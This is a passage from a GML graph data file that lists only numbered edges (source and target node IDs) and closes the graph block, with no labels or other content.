  ]
  edge [
    source 111
    target 1
  ]
  edge [
    source 112
    target 1
  ]
  edge [
    source 113
    target 1
  ]
  edge [
    source 114
    target 1
  ]
  edge [
    source 115
    target 1
  ]
  edge [
    source 116
    target 1
  ]
  edge [
    source 117
    target 118
  ]
  edge [
    source 119
    target 120
  ]
  edge [
    source 119
    target 71
  ]
  edge [
    source 119
    target 121
  ]
  edge [
    source 119
    target 122
  ]
  edge [
    source 119
    target 98
  ]
  edge [
    source 119
    target 100
  ]
  edge [
    source 119
    target 123
  ]
  edge [
    source 119
    target 73
  ]
  edge [
    source 119
    target 68
  ]
  edge [
    source 124
    target 125
  ]
  edge [
    source 127
    target 1
  ]
  edge [
    source 128
    target 129
  ]
  edge [
    source 128
    target 130
  ]
  edge [
    source 128
    target 131
  ]
  edge [
    source 128
    target 132
  ]
  edge [
    source 128
    target 133
  ]
  edge [
    source 128
    target 134
  ]
  edge [
    source 128
    target 122
  ]
  edge [
    source 128
    target 135
  ]
  edge [
    source 128
    target 59
  ]
  edge [
    source 136
    target 137
  ]
  edge [
    source 138
    target 139
  ]
  edge [
    source 138
    target 140
  ]
  edge [
    source 138
    target 32
  ]
  edge [
    source 138
    target 141
  ]
  edge [
    source 138
    target 142
  ]
  edge [
    source 138
    target 143
  ]
  edge [
    source 138
    target 144
  ]
  edge [
    source 138
    target 145
  ]
  edge [
    source 138
    target 146
  ]
  edge [
    source 138
    target 75
  ]
  edge [
    source 138
    target 147
  ]
  edge [
    source 138
    target 148
  ]
  edge [
    source 138
    target 127
  ]
  edge [
    source 138
    target 149
  ]
  edge [
    source 138
    target 91
  ]
  edge [
    source 138
    target 81
  ]
  edge [
    source 138
    target 59
  ]
  edge [
    source 138
    target 34
  ]
  edge [
    source 138
    target 150
  ]
  edge [
    source 138
    target 151
  ]
  edge [
    source 138
    target 77
  ]
  edge [
    source 138
    target 31
  ]
  edge [
    source 152
    target 153
  ]
  edge [
    source 152
    target 154
  ]
  edge [
    source 152
    target 155
  ]
  edge [
    source 156
    target 32
  ]
  edge [
    source 156
    target 45
  ]
  edge [
    source 156
    target 157
  ]
  edge [
    source 156
    target 158
  ]
  edge [
    source 156
    target 159
  ]
  edge [
    source 156
    target 130
  ]
  edge [
    source 156
    target 160
  ]
  edge [
    source 156
    target 161
  ]
  edge [
    source 156
    target 162
  ]
  edge [
    source 156
    target 2
  ]
  edge [
    source 156
    target 34
  ]
  edge [
    source 156
    target 163
  ]
  edge [
    source 156
    target 81
  ]
  edge [
    source 156
    target 75
  ]
  edge [
    source 156
    target 80
  ]
  edge [
    source 156
    target 84
  ]
  edge [
    source 156
    target 63
  ]
  edge [
    source 156
    target 149
  ]
  edge [
    source 156
    target 164
  ]
  edge [
    source 156
    target 31
  ]
  edge [
    source 156
    target 59
  ]
  edge [
    source 156
    target 126
  ]
  edge [
    source 156
    target 165
  ]
  edge [
    source 156
    target 91
  ]
  edge [
    source 156
    target 124
  ]
  edge [
    source 156
    target 141
  ]
  edge [
    source 156
    target 166
  ]
  edge [
    source 156
    target 167
  ]
  edge [
    source 156
    target 143
  ]
  edge [
    source 156
    target 152
  ]
  edge [
    source 156
    target 168
  ]
  edge [
    source 156
    target 169
  ]
  edge [
    source 156
    target 170
  ]
  edge [
    source 156
    target 77
  ]
  edge [
    source 171
    target 138
  ]
  edge [
    source 171
    target 172
  ]
]
